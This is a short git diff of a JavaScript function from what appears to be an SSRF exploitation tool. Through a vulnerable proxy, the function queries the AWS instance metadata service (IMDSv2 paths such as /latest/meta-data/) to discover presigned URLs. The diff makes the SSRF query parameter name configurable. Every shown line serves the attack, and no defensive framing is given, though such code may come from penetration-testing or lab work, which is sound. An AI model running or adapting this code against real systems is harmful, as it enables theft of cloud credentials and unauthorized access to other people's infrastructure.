@@ -28,7 +28,7 @@ export async function discoverPresignedURLs(proxyUrl, token) {
   for (const path of METADATA_PATHS) {
     try {
       const metadataUrl = `${CONFIG.imdsv2.baseUrl}${path}`;
-      const fullUrl = `${proxyUrl}?url=${metadataUrl}`;
+      const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;
 
       log(`Checking: ${path}...`, null, "dim");
 
@@ -62,7 +62,7 @@ export async function discoverPresignedURLs(proxyUrl, token) {
 
     try {
       const metadataUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
-      const fullUrl = `${proxyUrl}?url=${metadataUrl}`;
+      const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;
 
       const response = await axios.get(fullUrl, {
         headers: {
